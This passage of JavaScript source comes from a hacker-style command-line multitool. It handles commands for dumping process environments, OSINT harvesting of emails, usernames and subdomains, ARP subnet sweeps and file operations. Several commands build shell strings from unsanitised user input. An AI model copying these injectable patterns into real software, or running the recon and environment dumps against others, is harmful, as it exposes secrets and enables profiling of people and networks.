    if(input.startsWith("/memdump strings ")){var mpid=input.substring(17).trim();var mcmd;if(process.platform==="win32"){mcmd='powershell -c "Get-Process -Id '+mpid.replace(/[^0-9]/g,"")+' -ErrorAction SilentlyContinue | Select-Object Name,Id,PrivateMemorySize,CPU"';}else{mcmd="cat /proc/"+mpid.replace(/[^0-9]/g,"")+"/cmdline 2>/dev/null | tr '\\0' ' '; echo '---'; head -c 5000 /proc/"+mpid.replace(/[^0-9]/g,"")+"/maps 2>/dev/null";}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F9E0} MEM STRINGS: PID "+mpid+RST);console.log(TOOLS.exec(mcmd).substring(0,3000)+"\n");return;}
    if(input==="/memdump proc"){if(process.platform==="win32"){console.log(TOOLS.exec('powershell -c "Get-Process | Sort-Object PrivateMemorySize -Descending | Select-Object -First 20 Name,Id,@{Name=\"MemMB\";Expression={[math]::Round($_.PrivateMemorySize/1MB,1)}} | Format-Table"'));}else{console.log(TOOLS.exec("ps aux --sort=-rss | head -20 | awk '{print $2,$11,$6/1024\"MB\",$3\"%\"}'"));}return;}
    if(input.startsWith("/memdump env ")){var mepid=input.substring(13).trim().replace(/[^0-9]/g,"");var mecmd;if(process.platform==="win32"){mecmd='powershell -c "Get-Process -Id '+mepid+' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty StartInfo | Select-Object -ExpandProperty EnvironmentVariables"';}else{mecmd="cat /proc/"+mepid+"/environ 2>/dev/null | tr '\\0' '\\n' | head -40";}console.log("\n"+rgb(255,215,0)+BOLD+"  ENV: PID "+mepid+RST);console.log(TOOLS.exec(mecmd).substring(0,3000)+"\n");return;}
    if(input==="/memdump heap"){var mu=process.memoryUsage();console.log("\n"+rgb(255,215,0)+BOLD+"  BRO HEAP"+RST);console.log("  "+p("cyan","RSS: ")+(mu.rss/1024/1024).toFixed(1)+"MB");console.log("  "+p("cyan","Heap: ")+(mu.heapTotal/1024/1024).toFixed(1)+"MB total / "+(mu.heapUsed/1024/1024).toFixed(1)+"MB used");console.log("  "+p("cyan","External: ")+(mu.external/1024/1024).toFixed(1)+"MB");console.log("  "+p("cyan","ArrayBuffers: ")+(mu.arrayBuffers/1024/1024).toFixed(1)+"MB\n");return;}
    // ═══ OSINT HARVESTER / theHarvester-STYLE ═══
    if(input==="/harvest"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F33E} OSINT HARVESTER (theHarvester-style)"+RST);console.log(p("dim","  /harvest email NAME SITE       search emails on domain"));console.log(p("dim","  /harvest gh USER                GitHub profile recon"));console.log(p("dim","  /harvest dns DOMAIN             subdomain enum via DNS"));console.log(p("dim","  /harvest social USER            username search"));console.log(p("dim","  /harvest meta URL               extract metadata from page\n"));return;}
    if(input.startsWith("/harvest email ")){var he=input.substring(15).trim().split(" ");var hname=he[0],hsite=he[1];if(!hname||!hsite){console.log(p("red","  Usage: /harvest email NAME SITE\n"));return;}spin("harvesting emails on "+hsite,"search");try{var hres=await fetch("https://api.hunter.io/v2/domain-search?domain="+hsite+"&api_key="+(process.env.HUNTER_KEY||process.env.HUNTER_API_KEY||"demo"));var hd2=await hres.json();unspin();console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F4E7} EMAILS: "+hsite+RST);if(hd2.data&&hd2.data.emails){hd2.data.emails.slice(0,20).forEach(function(e){console.log("  "+p("cyan",e.value)+" "+p("dim","("+e.type+" "+(e.confidence||"?")+"%)"));});}else{console.log(p("dim","  No emails found. Try with HUNTER_KEY env var.\n"));console.log(p("dim","  Fallback: common patterns"));["info@"+hsite,"admin@"+hsite,"contact@"+hsite,"hello@"+hsite,"support@"+hsite,hname+"@"+hsite].forEach(function(e){console.log("  "+p("dim",e));});}console.log("");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input.startsWith("/harvest gh ")){var hgh=input.substring(12).trim();spin("github "+hgh,"search");try{var gr=await fetch("https://api.github.com/users/"+hgh);if(!gr.ok){unspin();console.log(p("red","  Not found\n"));return;}var gd2=await gr.json();unspin();console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F419} GITHUB: "+hgh+RST);console.log("  "+p("cyan","Name: ")+(gd2.name||"")+"  "+p("dim","Repos: "+(gd2.public_repos||0)+"  Followers: "+(gd2.followers||0)+"  Following: "+(gd2.following||0)));if(gd2.blog)console.log("  "+p("cyan","Blog: ")+gd2.blog);if(gd2.company)console.log("  "+p("cyan","Company: ")+gd2.company);if(gd2.location)console.log("  "+p("cyan","Location: ")+gd2.location);if(gd2.twitter_username)console.log("  "+p("cyan","Twitter: ")+"@"+gd2.twitter_username);console.log("  "+p("cyan","Bio: ")+(gd2.bio||"").substring(0,200));console.log("");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input.startsWith("/harvest dns ")){var hdns=input.substring(13).trim().replace(/[^a-zA-Z0-9.-]/g,"");var subs=["www","mail","api","admin","dev","staging","blog","shop","app","cdn","docs","test","beta","vpn","remote","portal","dashboard","login","auth","ftp","smtp","pop","imap","ns1","ns2","mx","webmail","secure","status"];console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F50D} SUBDOMAIN ENUM: "+hdns+RST);spin("enumerating "+subs.length+" subdomains for "+hdns,"search");var founds=[];var totalDone=0;for(var si=0;si<subs.length;si++){var subdom=subs[si]+"."+hdns;try{var r2=TOOLS.exec("host "+subdom+" 2>/dev/null | grep 'has address'").trim();if(r2){founds.push(subdom+"  "+p("green",r2.replace(subdom+" has address ","")));process.stdout.write("\r  "+p("green","FOUND: "+subdom)+"  ");}}catch(e){}totalDone++;if(totalDone%5===0)process.stdout.write("\r  "+p("dim","Checked: "+totalDone+"/"+subs.length));}process.stdout.write("\r"+" ".repeat(50)+"\r");unspin();founds.forEach(function(f){console.log("  "+f);});console.log(p("dim","\n  Found "+founds.length+" subdomains out of "+subs.length+" tested.\n"));return;}
    if(input.startsWith("/harvest social ")){var hsu=input.substring(16).trim();var sites=[{name:"GitHub",url:"https://github.com/"+hsu},{name:"Twitter",url:"https://twitter.com/"+hsu},{name:"Instagram",url:"https://instagram.com/"+hsu},{name:"Reddit",url:"https://reddit.com/user/"+hsu},{name:"HackerNews",url:"https://news.ycombinator.com/user?id="+hsu},{name:"GitLab",url:"https://gitlab.com/"+hsu},{name:"Dev.to",url:"https://dev.to/"+hsu},{name:"Medium",url:"https://medium.com/@"+hsu},{name:"Keybase",url:"https://keybase.io/"+hsu}];console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F50D} SOCIAL SCAN: "+hsu+RST);spin("checking "+sites.length+" sites","search");var present=[];var totalC=0;for(var ss=0;ss<sites.length;ss++){try{var scode=TOOLS.exec("curl -s -o /dev/null -w '%{http_code}' --head "+sites[ss].url+" 2>/dev/null").trim();if(scode==="200"||scode==="301"||scode==="302")present.push(sites[ss]);}catch(e){}totalC++;process.stdout.write("\r  "+p("dim","Checked: "+totalC+"/"+sites.length));}process.stdout.write("\r"+" ".repeat(40)+"\r");unspin();if(present.length){present.forEach(function(s){console.log("  "+p("green","\u2713")+" "+s.name+" "+p("dim",s.url));});}else{console.log(p("dim","  No profiles found.\n"));}console.log("");return;}
    if(input.startsWith("/harvest meta ")){var hmu=input.substring(14).trim();if(!hmu.startsWith("http"))hmu="https://"+hmu;spin("scraping meta "+hmu,"search");try{var hmr=await fetch(hmu);var html=await hmr.text();unspin();var meta={};var mt=html.match(/<title[^>]*>([^<]+)<\/title>/i);if(mt)meta.title=mt[1].trim();var md=html.match(/<meta[^>]+name="description"[^>]+content="([^"]+)"/i);if(md)meta.desc=md[1];var mkw=html.match(/<meta[^>]+name="keywords"[^>]+content="([^"]+)"/i);if(mkw)meta.keywords=mkw[1];var mv=html.match(/<meta[^>]+name="viewport"[^>]+content="([^"]+)"/i);if(mv)meta.viewport=mv[1];var mg=html.match(/<meta[^>]+name="generator"[^>]+content="([^"]+)"/i);if(mg)meta.generator=mg[1];console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F4C4} META: "+hmu+RST);console.log("  "+p("cyan","Title: ")+(meta.title||"?"));if(meta.desc)console.log("  "+p("cyan","Desc: ")+meta.desc.substring(0,150));if(meta.keywords)console.log("  "+p("cyan","Keywords: ")+meta.keywords.substring(0,150));if(meta.viewport)console.log("  "+p("cyan","Viewport: ")+meta.viewport);if(meta.generator)console.log("  "+p("cyan","Generator: ")+meta.generator);var em=html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);if(em){var ue=[];var seen3={};em.forEach(function(e){if(!seen3[e]){seen3[e]=true;ue.push(e);}});if(ue.length){console.log("  "+p("yellow","\n  \u{1F4E7} Emails found: "+ue.length));ue.slice(0,15).forEach(function(e){console.log("  "+p("cyan",e));});}}var links=html.match(/href=["'](https?:\/\/[^"']+)["']/gi);if(links){var ul=[];var seenl={};links.forEach(function(l){var u=l.replace(/href=["']/i,"").replace(/["']$/,"");if(!seenl[u]){seenl[u]=true;ul.push(u);}});if(ul.length>1){console.log("  "+p("yellow","\n  \u{1F517} External links: "+ul.length));ul.filter(function(l){return !l.includes(hmu.replace(/https?:\/\//,""));}).slice(0,15).forEach(function(l){console.log("  "+p("dim",l.substring(0,100)));});}}console.log("");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    // ═══ SNIFF / PACKET ANALYZER ═══
    if(input==="/sniff"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} SNIFF — Network Analyzer"+RST);console.log(p("dim","  /sniff stats                 interface RX/TX byte counters"));console.log(p("dim","  /sniff iface IFACE           single interface detail"));console.log(p("dim","  /sniff live [IFACE] [SECS]   live packet-per-second monitor"));console.log(p("dim","  /sniff arp                   ARP table (neighbors)"));console.log(p("dim","  /sniff listen                listening services (ss -tlnp)"));console.log(p("dim","  /sniff tcp                   TCP connection stats"));console.log(p("dim","  /sniff top [IFACE]           top 10 by bytes transferred\n"));return;}
    if(input==="/sniff stats"){var ifaces=parseNetDev();if(!ifaces.length){console.log(p("dim","\n  No interfaces found. /proc/net/dev unavailable?\n"));return;}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4CA} IFACE STATS"+RST);console.log("  "+p("dim","Iface        RX bytes     TX bytes     RX pkts    TX pkts    RX err/drop   TX err/drop"));ifaces.forEach(function(iface){var name2=iface.name.padEnd(12);var line="  "+p("cyan",name2)+" "+formatBytes(iface.rxBytes).padEnd(14)+" "+formatBytes(iface.txBytes).padEnd(14)+" "+String(iface.rxPackets).padEnd(10)+" "+String(iface.txPackets).padEnd(10)+" "+p("yellow",iface.rxErrs+"/"+iface.rxDrops).padEnd(12)+" "+p("yellow",iface.txErrs+"/"+iface.txDrops);console.log(line);});var totalRx=ifaces.reduce(function(a,f){return a+f.rxBytes;},0);var totalTx=ifaces.reduce(function(a,f){return a+f.txBytes;},0);console.log("  "+p("dim","─".repeat(90)));console.log("  "+p("green","TOTAL       ")+p("green",formatBytes(totalRx)+" rx / "+formatBytes(totalTx)+" tx")+"\n");return;}
    if(input.startsWith("/sniff iface ")){var sni=input.substring(13).trim();var ifaces2=parseNetDev();var fi=ifaces2.find(function(f){return f.name===sni;});if(!fi){console.log(p("red","\n  IFace '"+sni+"' not found.\n"));return;}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} "+fi.name.toUpperCase()+RST);console.log("  "+p("cyan","─ RX ─"));console.log("  Bytes:   "+formatBytes(fi.rxBytes)+"  ("+fi.rxPackets+" packets)");console.log("  Errors:  "+p("yellow",fi.rxErrs)+"  Drops: "+p("yellow",fi.rxDrops));console.log("  "+p("cyan","─ TX ─"));console.log("  Bytes:   "+formatBytes(fi.txBytes)+"  ("+fi.txPackets+" packets)");console.log("  Errors:  "+p("yellow",fi.txErrs)+"  Drops: "+p("yellow",fi.txDrops));var ratio=fi.txBytes+fi.rxBytes>0?((fi.txBytes-fi.rxBytes)/(fi.txBytes+fi.rxBytes)*100).toFixed(1):0;var dir=Number(ratio)>0?"↑ upload-heavy":"↓ download-heavy";console.log("  "+p("dim","Ratio:   "+Math.abs(ratio)+"% "+dir));console.log("");return;}
    if(input==="/sniff tcp"){var tcp=parseNetStatTcp();console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4CA} TCP STATISTICS"+RST);console.log("  "+p("cyan","Active opens: ")+tcp.activeOpens+p("dim","  Passive opens: "+tcp.passiveOpens));console.log("  "+p("cyan","Curr established: ")+p("green",tcp.estab));console.log("  "+p("cyan","Segments in: ")+tcp.inSegs+p("dim","  out: "+tcp.outSegs));console.log("  "+p("yellow","Retransmits: ")+tcp.retrans+p("dim","  Failed conns: "+tcp.failedConns));console.log("  "+p("yellow","Resets rcvd: ")+tcp.resetRcvd);if(tcp.outSegs>0){var retransPct=(tcp.retrans/tcp.outSegs*100).toFixed(2);console.log("  "+p("dim","Retransmit rate: "+retransPct+"% "+(retransPct>5?p("yellow","⚠ high")+p("dim"," — check network") :p("green","✓ clean"))));}console.log("");return;}
    if(input==="/sniff arp"){var arp=parseArpTable();console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} ARP TABLE"+RST);if(!arp.length){console.log(p("dim","  Empty ARP table.\n"));return;}console.log("  "+p("dim","IP              MAC               Flags  Iface"));arp.forEach(function(e){console.log("  "+p("cyan",e.ip.padEnd(16))+" "+e.mac.padEnd(18)+" "+p("dim",(e.flags||"").padEnd(7))+" "+e.iface);});console.log("");return;}
    if(input==="/sniff listen"){var lp=parseListeningPorts();console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F442} LISTENING PORTS"+RST);console.log(lp?"\n"+lp+"\n":p("dim","\n  No listening ports or ss/netstat unavailable.\n"));return;}
    if(input==="/sniff top"||input.startsWith("/sniff top ")){var sf=input.length>9?input.substring(10).trim():"";var ifaces3=parseNetDev();if(!ifaces3.length){console.log(p("dim","\n  No interfaces.\n"));return;}if(sf){ifaces3=ifaces3.filter(function(f){return f.name===sf;});if(!ifaces3.length){console.log(p("red","\n  IFace '"+sf+"' not found.\n"));return;}}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4CA} TOP TALKERS"+RST);var byRX=[].concat(ifaces3).sort(function(a,b){return b.rxBytes-a.rxBytes;});var byTX=[].concat(ifaces3).sort(function(a,b){return b.txBytes-a.txBytes;});console.log("  "+p("cyan","─ RX (download) ─"));byRX.forEach(function(f,i){if(i>=10)return;var bar="█".repeat(Math.min(30,Math.round(f.rxBytes/Math.max(1,byRX[0].rxBytes)*30)));console.log("  "+p("cyan",f.name.padEnd(12))+" "+formatBytes(f.rxBytes).padEnd(12)+" "+p("green",bar));});console.log("  "+p("cyan","─ TX (upload) ─"));byTX.forEach(function(f,i){if(i>=10)return;var bar="█".repeat(Math.min(30,Math.round(f.txBytes/Math.max(1,byTX[0].txBytes)*30)));console.log("  "+p("cyan",f.name.padEnd(12))+" "+formatBytes(f.txBytes).padEnd(12)+" "+p("yellow",bar));});console.log("");return;}
    if(input.startsWith("/sniff live ")){var sl=input.substring(12).trim();var ssl=sl.split(" ");var siface=ssl[0];var ssecs=parseInt(ssl[1])||5;if(ssecs<1||ssecs>60)ssecs=5;var prevSnap=parseNetDev();if(!prevSnap.length){console.log(p("dim","\n  No interfaces.\n"));return;}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F3A4} SNIFFING "+ssecs+"s"+(siface?" on "+siface:"")+RST);console.log(p("dim","  Sampling every 1s... (ESC to cancel)\n"));for(var t=0;t<ssecs;t++){await sleep(1000);var curSnap=parseNetDev();if(siface){prevSnap=prevSnap.filter(function(f){return f.name===siface;});curSnap=curSnap.filter(function(f){return f.name===siface;});}var rxRate=0,txRate=0,rxPkt=0,txPkt=0;curSnap.forEach(function(c){var p=prevSnap.find(function(f){return f.name===c.name;});if(p){rxRate+=c.rxBytes-p.rxBytes;txRate+=c.txBytes-p.txBytes;rxPkt+=c.rxPackets-p.rxPackets;txPkt+=c.txPackets-p.txPackets;}});prevSnap=curSnap;var icon=rxRate>txRate?"\u{1F4E5}":"\u{1F4E4}";var rbar="█".repeat(Math.min(20,Math.round(rxRate/Math.max(1,rxRate+txRate)*20)));var tbar="█".repeat(Math.min(20,Math.round(txRate/Math.max(1,rxRate+txRate)*20)));console.log("  "+icon+" "+p("green",rbar)+p("yellow",tbar)+p("dim","  rx:"+formatBytes(rxRate)+"/s ("+rxPkt+"p)  tx:"+formatBytes(txRate)+"/s ("+txPkt+"p)"));}console.log("\n"+p("green","  Sniff done.\n"));return;}
    // ═══ ARP SWEEP ═══
    if(input==="/arp"){var autoSub=getSubnetPrefix();console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} ARP SCANNER"+RST);console.log(p("dim","  /arp sweep [SUBNET]         scan entire /24 subnet"));console.log(p("dim","  /arp sweep live             continuous watch for new devices"));console.log(p("dim","  /arp table                  current ARP cache"));console.log(p("dim","  /arp vendor                 known OUI vendor lookup"));console.log(p("dim","  Auto subnet: "+autoSub+".0/24\n"));return;}
    if(input.startsWith("/arp sweep live")){var asub=input.length>14?input.substring(14).trim():"auto";if(asub==="auto")asub=getSubnetPrefix();arpScanning=true;var seenMacs={};console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} ARP WATCH: "+asub+".0/24"+RST);console.log(p("dim","  Continuous sweep every 5s. /arp stop to end.\n"));var sweepCount=0;while(arpScanning){sweepCount++;var newDevs=0;for(var i=1;i<=255;i++){var sip=asub+'.'+i;var so=TOOLS.exec("ping -c 1 -W 0.5 "+sip+" 2>/dev/null | grep 'bytes from' | head -1; arp -n "+sip+" 2>/dev/null | tail -1").trim();if(!so){if(sweepCount===1)process.stdout.write("\r  "+p("dim","Sweep "+sweepCount+" scanning ."+i));continue;}var macM=so.match(/([0-9A-Fa-f]{1,2}[:-]){5}[0-9A-Fa-f]{1,2}/);var curMac=macM?macM[0].toUpperCase():sip;if(!seenMacs[curMac]){seenMacs[curMac]=true;newDevs++;var vendor=getOUI(macM?macM[0]:null);var msM=so.match(/time[=<]([0-9.]+)\s*ms/);var lat=msM?msM[1]+"ms":"?";console.log("\n  "+p("green","\u2713 NEW: ")+p("cyan",sip)+"  "+p("dim","["+(macM?macM[0]:"?")+"]")+(vendor?"  "+p("yellow",vendor):"")+p("dim","  "+lat));}}process.stdout.write("\r  "+p("dim","Sweep "+sweepCount+" done  devices: "+Object.keys(seenMacs).length+" (new: +"+newDevs+")"));await sleep(5000);}return;}
    if(input==="/arp stop"){arpScanning=false;console.log(p("yellow","\n  ARP sweep stopped.\n"));return;}
    if(input==="/arp table"||input==="/arp cache"){var atable=parseArpTable();console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} ARP CACHE"+RST);if(!atable.length){console.log(p("dim","  Empty or /proc/net/arp unavailable.\n"));return;}console.log("  "+p("dim","IP              MAC               Vendor"));atable.forEach(function(e){var v=getOUI(e.mac)||"";console.log("  "+p("cyan",e.ip.padEnd(16))+" "+e.mac.padEnd(18)+" "+p(v?"yellow":"dim",v||"unknown"));});console.log("");return;}
    if(input==="/arp vendor"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F3ED} OUI VENDOR DB"+RST);var vendors={};Object.values(OUI_CACHE).filter(Boolean).forEach(function(v){vendors[v]=true;});var vl=Object.keys(vendors).sort();console.log(p("dim","  Cached vendors from seen MACs:"));vl.forEach(function(v){console.log("  \u2022 "+v);});if(!vl.length)console.log(p("dim","  None cached yet. Run /arp sweep to populate."));console.log("");return;}
    if(input.startsWith("/arp sweep ")){var as2=input.substring(11).trim();if(as2==="auto")as2=getSubnetPrefix();console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} ARP SWEEP: "+as2+".0/24"+RST);console.log(p("dim","  Pinging 254 hosts...\n"));if(process.platform==="win32"){var fping=TOOLS.exec("for /L %i in (1,1,254) do @ping -n 1 -w 100 "+as2+".%i | find \"Reply\" 2>nul");console.log(fping.substring(0,3000));}else{var alive=[];for(var i=1;i<=255;i++){var aip=as2+'.'+i;var ao=TOOLS.exec("ping -c 1 -W 0.6 "+aip+" 2>/dev/null | grep 'bytes from' | head -1; arp -n "+aip+" 2>/dev/null | tail -1").trim();if(!ao){if(i%10===0)process.stdout.write("\r  "+p("dim","Scanning ."+i+"/254"));continue;}var am=ao.match(/([0-9A-Fa-f]{1,2}[:-]){5}[0-9A-Fa-f]{1,2}/);var av=am?getOUI(am[0]):null;var ams=ao.match(/time[=<]([0-9.]+)\s*ms/);alive.push({ip:aip,mac:am?am[0]:"?",vendor:av,ms:ams?parseFloat(ams[1]):null});process.stdout.write("\r  "+p("green","ALIVE: "+aip)+"  "+p("dim","["+(am?am[0]:"?")+"]")+(av?"  "+p("yellow",av):"")+"  ");}process.stdout.write("\r"+" ".repeat(70)+"\r");arpLastScan=as2;if(alive.length){console.log("\n  "+rgb(255,215,0)+BOLD+"DEVICES ("+alive.length+")"+RST);console.log("  "+p("dim","IP              MAC               Vendor              Latency"));alive.forEach(function(d){var ms2=d.ms!==null?d.ms.toFixed(1)+"ms":"-";console.log("  "+p("cyan",d.ip.padEnd(16))+" "+d.mac.padEnd(18)+" "+p(d.vendor?"yellow":"dim",(d.vendor||"?").padEnd(18))+" "+ms2);});}else{console.log(p("dim","\n  No hosts responded.\n"));}}console.log("");return;}
    if(input==="/arp sweep"||input==="/arp scan"){var asub3=getSubnetPrefix();return handleInput("/arp sweep "+asub3);}
    // ═══ FILE OPERATIONS ═══
    if(input==="/rename"||input==="/rename --help"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4C2} BATCH RENAME"+RST);console.log(p("dim","  /rename DIR PREFIX         add prefix to all files"));console.log(p("dim","  /rename DIR .old .new      replace in names"));console.log(p("dim","  /rename DIR num            number files (001, 002,...)"));console.log(p("dim","  /rename DIR lower|UPPER    change case\n"));return;}
    if(input.startsWith("/rename ")){var rn=input.substring(8).trim();var rp=rn.split(" ");var rdir=rp[0];if(!existsSync(rdir)){console.log(p("red","  Dir not found: "+rdir+"\n"));return;}
      if(rp[1]==="num"){var rfs=readdirSync(rdir).sort();var changed=0;rfs.forEach(function(f,i){var oldP=join(rdir,f);var ext=extname(f);var nf=String(i+1).padStart(3,"0")+ext;var newP=join(rdir,nf);if(oldP===newP)return;renameSync(oldP,newP);changed++;});console.log(p("green","  Renamed "+changed+" files with numeric sequence.\n"));return;}
      if(rp[1]==="lower"){var rfs2=readdirSync(rdir);var ch2=0;rfs2.forEach(function(f){var oldP=join(rdir,f);var nf=f.toLowerCase();if(f===nf)return;var newP=join(rdir,nf);renameSync(oldP,newP);ch2++;});console.log(p("green","  Lowercased "+ch2+" files.\n"));return;}
      if(rp[1]==="UPPER"){var rfs3=readdirSync(rdir);var ch3=0;rfs3.forEach(function(f){var oldP=join(rdir,f);var nf=f.toUpperCase();if(f===nf)return;var newP=join(rdir,nf);renameSync(oldP,newP);ch3++;});console.log(p("green","  Uppercased "+ch3+" files.\n"));return;}
      if(rp.length>=3){var rfrom=rp[1],rto=rp[2];var rfs4=readdirSync(rdir);var ch4=0;rfs4.forEach(function(f){if(!f.includes(rfrom))return;var oldP=join(rdir,f);var nf=f.split(rfrom).join(rto);var newP=join(rdir,nf);renameSync(oldP,newP);ch4++;});console.log(p("green","  Replaced '"+rfrom+"' → '"+rto+"' in "+ch4+" files.\n"));return;}
      if(rp[1]){var prefix=rp[1];var rfs5=readdirSync(rdir);var ch5=0;rfs5.forEach(function(f){var oldP=join(rdir,f);if(f.startsWith(prefix))return;var newP=join(rdir,prefix+f);renameSync(oldP,newP);ch5++;});console.log(p("green","  Added prefix '"+prefix+"' to "+ch5+" files.\n"));return;}}
    if(input==="/dupes"||input.startsWith("/dupes ")){var ddir=input.length>6?input.substring(7).trim()||process.cwd():process.cwd();if(!existsSync(ddir)){console.log(p("red","  Dir not found: "+ddir+"\n"));return;}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F50D} DUPLICATE FINDER: "+ddir+RST);var dupeMap={};var dupeTotal=0;try{var dfs=readdirSync(ddir);dfs.forEach(function(f){var fp=join(ddir,f);try{var st=statSync(fp);if(!st.isFile())return;var sz=st.size;var key=f+"|"+sz;if(!dupeMap[key])dupeMap[key]=[];dupeMap[key].push(fp);}catch(e){}});Object.keys(dupeMap).forEach(function(k){if(dupeMap[k].length>1){dupeTotal+=dupeMap[k].length-1;console.log(p("yellow","  \u{26A0} "+k.split("|")[0]+" ("+dupeMap[k].length+" copies)"));}});if(!dupeTotal)console.log(p("green","  No duplicates found."));console.log(p("dim","  "+dupeTotal+" duplicate file(s) total.\n"));}catch(e){console.log(p("red","  Error: "+e.message+"\n"));}return;}
    if(input.startsWith("/archive ")){var aDir=input.substring(9).trim(),aName=basename(aDir)+".tar.gz";console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E6} ARCHIVE: "+aDir+" → "+aName+RST);var ao2=TOOLS.exec("tar -czf "+aName+" -C "+dirname(aDir)+" "+basename(aDir)+" 2>&1");console.log(p("green","  Created "+aName+" ("+formatBytes(statSync(aName).size)+")\n"));return;}
    if(input.startsWith("/extract ")){var eFile=input.substring(9).trim();if(!existsSync(eFile)){console.log(p("red","  File not found: "+eFile+"\n"));return;}var eDir=eFile.replace(/\.(tar\.gz|tgz|tar|zip|gz)$/,"")||"extracted";try{mkdirSync(eDir,{recursive:true});}catch(e){}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E4} EXTRACT: "+eFile+" → "+eDir+RST);var eo=TOOLS.exec("tar -xzf "+eFile+" -C "+eDir+" 2>&1");console.log(p("green","  Extracted to "+eDir+"\n"));return;}
    if(input.startsWith("/diff2 ")){var d2=input.substring(7).trim().split(" ");var f1=d2[0],f2=d2[1];if(!f1||!f2){console.log(p("dim","  /diff2 FILE1 FILE2\n"));return;}if(!existsSync(f1)){console.log(p("red","  Missing: "+f1+"\n"));return;}if(!existsSync(f2)){console.log(p("red","  Missing: "+f2+"\n"));return;}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4CB} DIFF: "+f1+" ↔ "+f2+RST);var dout=TOOLS.exec("diff -u "+f1+" "+f2+" 2>&1").substring(0,4000);if(!dout.trim())console.log(p("green","  Files are identical.\n"));else console.log(p("dim",dout+"\n"));return;}
    if(input.startsWith("/hex ")){var hf=input.substring(5).trim();if(!existsSync(hf)){console.log(p("red","  File not found: "+hf+"\n"));return;}var hbuf=readFileSync(hf);var hlen=Math.min(hbuf.length,1024);console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F9EA} HEX DUMP: "+hf+" ("+formatBytes(hbuf.length)+")"+RST);var hout="";for(var i=0;i<hlen;i+=16){var hex="",asc="";for(var j=0;j<16&&i+j<hlen;j++){var b=hbuf[i+j];hex+=(b<16?"0":"")+b.toString(16)+" ";asc+=(b>=32&&b<127)?String.fromCharCode(b):".";}hout+=p("dim",(i.toString(16).padStart(8,"0"))+"  ")+hex.padEnd(48)+" "+asc+"\n";}console.log(hout);if(hbuf.length>hlen)console.log(p("dim","  ... truncated ("+formatBytes(hbuf.length-hlen)+" more)\n"));return;}
    if(input.startsWith("/media ")){var mf=input.substring(7).trim();if(!existsSync(mf)){console.log(p("red","  File not found: "+mf+"\n"));return;}var ms=statSync(mf);var mext=extname(mf).toLowerCase();console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F3AC} MEDIA INFO: "+mf+RST);console.log(p("cyan","  Path:     ")+mf);console.log(p("cyan","  Type:     ")+mext);console.log(p("cyan","  Size:     ")+formatBytes(ms.size));console.log(p("cyan","  Modified: ")+ms.mtime.toISOString());if(mext===".png"||mext===".jpg"||mext===".jpeg"||mext===".gif"||mext===".webp"||mext===".bmp"){var mbuf=readFileSync(mf);if(mbuf[0]===0xFF&&mbuf[1]===0xD8)console.log(p("dim","  Magic: JPEG"));else if(mbuf[0]===0x89&&mbuf[1]===0x50)console.log(p("dim","  Magic: PNG"));else if(mbuf[0]===0x47&&mbuf[1]===0x49)console.log(p("dim","  Magic: GIF"));else if(mbuf[0]===0x52&&mbuf[1]===0x49)console.log(p("dim","  Magic: WEBP/RIFF"));
      if(mext===".png"&&mbuf[16]&&mbuf[20]){var w=mbuf[16]<<24|mbuf[17]<<16|mbuf[18]<<8|mbuf[19];var h=mbuf[20]<<24|mbuf[21]<<16|mbuf[22]<<8|mbuf[23];console.log(p("cyan","  Dimensions: ")+w+"×"+h);}}
    if(mext===".mp3"||mext===".wav"||mext===".ogg"||mext===".flac"){
      var mb2=readFileSync(mf);if(mext===".wav"){var ch=mb2[22]||1,sr=(mb2[24]||0)|(mb2[25]<<8)|(mb2[26]<<16)|(mb2[27]<<24),bps=mb2[34]||16,dur=ms.size>44?(ms.size-44)/(sr*bps/8):0;console.log(p("cyan","  Channels:  ")+ch);console.log(p("cyan","  SampleRate:")+sr+" Hz");console.log(p("cyan","  BitDepth:  ")+bps);console.log(p("cyan","  Duration:  ")+Math.floor(dur)+"s");}
      else console.log(p("dim","  Use ffprobe for detailed audio metadata."));}
    console.log("");return;}
    // ═══ PRODUCTIVITY ═══
